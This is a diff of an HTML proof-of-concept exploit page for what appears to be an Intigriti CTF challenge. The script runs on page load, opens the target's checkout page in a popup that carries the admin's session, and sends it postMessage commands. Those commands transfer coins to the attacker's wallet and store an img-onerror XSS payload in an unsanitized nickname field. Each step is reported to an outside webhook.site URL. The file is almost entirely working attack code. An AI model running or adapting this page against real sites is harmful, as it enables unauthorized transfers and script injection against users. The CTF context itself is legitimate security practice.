@@ -1,118 +1,114 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>XSS PoC</title>
-</head>
 <body>
     <h1>EXPLOIT LOADED</h1>
-    <div id="status">Initializing...</div>
+    <div id="log">Initializing...</div>
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
         const WEBHOOK = 'https://webhook.site/f324d507-94fa-4265-8946-2b290873a05e';
         const YOUR_WALLET = '1cc4a7735c998cb4b4e390e97c349281d2';
 
-        // XSS Payload - will trigger when transaction loads in marketwatch
-        // The nickname field in marketwatch.html is unsanitized (line 326-328)
+        // XSS Payload - will trigger alert('gigawatz') when transaction loads in marketwatch
         const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
 
-        // Webhook tracking function
+        const logDiv = document.getElementById('log');
+
+        function log(msg, className = '') {
+            const timestamp = new Date().toLocaleTimeString();
+            logDiv.innerHTML += `<span class="${className}">[${timestamp}] ${msg}</span><br>`;
+            console.log(msg);
+        }
+
         function track(step, status, data = {}) {
             const url = `${WEBHOOK}?step=${step}&status=${status}&timestamp=${Date.now()}&data=${encodeURIComponent(JSON.stringify(data))}`;
             fetch(url, { mode: 'no-cors' }).catch(() => {});
-            console.log(`[${step}] ${status}`, data);
-        }
-
-        function updateStatus(html, className = '') {
-            const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = html;
-            if (className) statusDiv.className = className;
         }
 
         async function executeExploit() {
-            updateStatus('Starting exploit...<br>Sending coins and injecting XSS...', 'info');
+            log('Starting XSS exploit via postMessage...', 'info');
+            track('start', 'admin_visited_exploit', { wallet: YOUR_WALLET });
 
-            track('start', 'admin_visited_exploit', {
-                target_wallet: YOUR_WALLET,
-                xss_payload: XSS_PAYLOAD
-            });
+            // Open checkout.html in popup - inherits admin session via SameSite=Lax
+            const checkoutUrl = `${BASE}/checkout.html?currency=1337COIN&price=1337`;
+            log(`Opening checkout in popup...`, 'info');
 
-            try {
-                // Step 1: Send 1337COIN to your wallet
-                updateStatus('[1/2] Sending 1337COIN to ' + YOUR_WALLET + '...', 'info');
-                track('step1', 'sending_coins_start', { to: YOUR_WALLET, amount: 1337 });
+            const popup = window.open(checkoutUrl, 'checkout', 'width=1000,height=800');
 
-                const tx1Response = await fetch(`${BASE}/api/transaction`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    credentials: 'include',
-                    body: JSON.stringify({
+            if (!popup) {
+                log('ERROR: Popup blocked! Please allow popups.', 'error');
+                track('error', 'popup_blocked', {});
+                return;
+            }
+
+            log('Popup opened - admin session inherited', 'success');
+            track('popup_opened', 'success', {});
+
+            // Wait for popup to load, then send malicious postMessage
+            // We need to send TWO transactions
+
+            setTimeout(async () => {
+                // Transaction 1: Send 1337COIN to your wallet
+                log('Sending TX #1: 1337COIN to ' + YOUR_WALLET, 'info');
+                track('tx1_start', 'sending_coins', { to: YOUR_WALLET });
+
+                popup.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
                         toAddress: YOUR_WALLET,
                         currency: '1337COIN',
-                        amount: 1337
-                    })
-                });
+                        amount: 1337,
+                        nickname: 'CTF Player'
+                    }
+                }, '*');
 
-                if (tx1Response.ok) {
-                    const tx1Data = await tx1Response.json();
-                    updateStatus('[1/2] ✓ Sent 1337COIN to ' + YOUR_WALLET + '!<br>[2/2] Injecting XSS payload...', 'success');
-                    track('step1', 'coin_transfer_success', { txHash: tx1Data.txHash || 'completed' });
-                } else {
-                    updateStatus('[1/2] ✗ Failed to send coins<br>Status: ' + tx1Response.status, 'error');
-                    track('step1', 'coin_transfer_failed', { status: tx1Response.status });
-                }
+                log('TX #1 sent via postMessage', 'success');
+                track('tx1_sent', 'postMessage_sent', { to: YOUR_WALLET });
 
-                // Step 2: Create transaction with XSS payload in nickname
-                // The nickname field is unsanitized in marketwatch.html (line 326-328)
-                // This will trigger alert('gigawatz') when admin views marketwatch
-                updateStatus('[2/2] Creating transaction with XSS payload in nickname...', 'info');
-                track('step2', 'injecting_xss_start', { payload: XSS_PAYLOAD });
+                // Wait a bit, then send TX #2
+                await new Promise(r => setTimeout(r, 1500));
 
-                const tx2Response = await fetch(`${BASE}/api/transaction`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    credentials: 'include',
-                    body: JSON.stringify({
+                // Transaction 2: Send 1337COIN to xss-payload with XSS in nickname
+                log('Sending TX #2: XSS payload injection...', 'info');
+                track('tx2_start', 'injecting_xss', { payload: XSS_PAYLOAD });
+
+                popup.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
                         toAddress: 'xss-payload',
                         currency: '1337COIN',
                         amount: 1337,
-                        nickname: XSS_PAYLOAD  // This goes into unsanitized nickname field!
-                    })
+                        nickname: XSS_PAYLOAD  // UNSANITIZED in marketwatch.html:326-328
+                    }
+                }, '*');
+
+                log('TX #2 sent - XSS injected in nickname!', 'success');
+                track('tx2_sent', 'xss_injected', {
+                    payload: XSS_PAYLOAD,
+                    trigger: 'marketwatch_nickname_field'
                 });
 
-                if (tx2Response.ok) {
-                    const tx2Data = await tx2Response.json();
-                    updateStatus('[2/2] ✓ XSS transaction created!<br><br>EXPLOIT COMPLETE!<br><br>When admin visits marketwatch,<br>the XSS will trigger: <strong>alert("gigawatz")</strong>', 'success');
-                    track('step2', 'xss_injected_success', {
-                        txHash: tx2Data.txHash || 'completed',
-                        payload: XSS_PAYLOAD,
-                        trigger_location: 'marketwatch_nickname_field'
-                    });
-                } else {
-                    updateStatus('[2/2] ✗ Failed to create XSS transaction<br>Status: ' + tx2Response.status, 'error');
-                    track('step2', 'xss_inject_failed', { status: tx2Response.status });
+                // Final tracking
+                track('complete', 'exploit_complete', {
+                    message: 'Admin must visit marketwatch to trigger XSS',
+                    expected_alert: 'gigawatz'
+                });
+
+                log('EXPLOIT COMPLETE!', 'success');
+                log('Transactions submitted:', 'info');
+                log('  1. 1337COIN -> ' + YOUR_WALLET, 'info');
+                log('  2. 1337COIN -> xss-payload (XSS in nickname)', 'info');
+                log('', '');
+                log('When admin visits marketwatch.html:', 'info');
+                log('  XSS will trigger: alert("gigawatz")', 'success');
+
+            }, 3000);
+
+            // Close popup after completion
+            setTimeout(() => {
+                if (popup && !popup.closed) {
+                    popup.close();
+                    log('Popup closed', 'info');
                 }
-
-                // Final webhook notification
-                track('complete', 'exploit_finished', {
-                    coin_transfer: tx1Response.ok,
-                    xss_injected: tx2Response.ok,
-                    message: 'Admin should now trigger XSS by visiting marketwatch'
-                });
-
-                // Redirect to marketwatch after a delay to trigger the XSS
-                setTimeout(() => {
-                    updateStatus('Redirecting to marketwatch to trigger XSS...', 'info');
-                    track('redirect', 'going_to_marketwatch', {});
-                    setTimeout(() => {
-                        window.location.href = `${BASE}/marketwatch.html`;
-                    }, 1000);
-                }, 2000);
-
-            } catch (error) {
-                updateStatus('ERROR: ' + error.message, 'error');
-                track('error', 'exception', { error: error.message, stack: error.stack });
-            }
+            }, 8000);
         }
 
         // Auto-execute on page load
@@ -122,4 +118,3 @@
     </script>
 </body>
 </html>
-
